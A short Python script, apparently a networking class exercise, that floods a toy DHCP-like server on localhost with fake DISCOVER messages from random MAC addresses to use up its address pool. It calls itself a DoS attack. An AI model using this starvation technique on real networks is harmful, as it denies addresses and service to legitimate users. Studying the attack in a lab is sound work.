import random

from socket import *


def get_random_mac():
    return "02:00:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                        random.randint(0, 255),
                                        random.randint(0, 255))


def main():
    sock = socket(AF_INET, SOCK_DGRAM)
    print("Sending LIST request to DHCP server")

    for i in range(14):
        fake_discover = f'DISCOVER\n' \
                        f'MAC Address: {get_random_mac()}\n' \
                        f'IP Address: 0.0.0.0\n' \
                        f'Time Stamp: 0\n'

        sock.sendto(fake_discover.encode(), ('localhost', 12000))
        _ = sock.recv(2048)
        print(f'[{i}] Hogging ip')

    sock.close()

    print("DoS attack completed")


if __name__ == "__main__":
    main()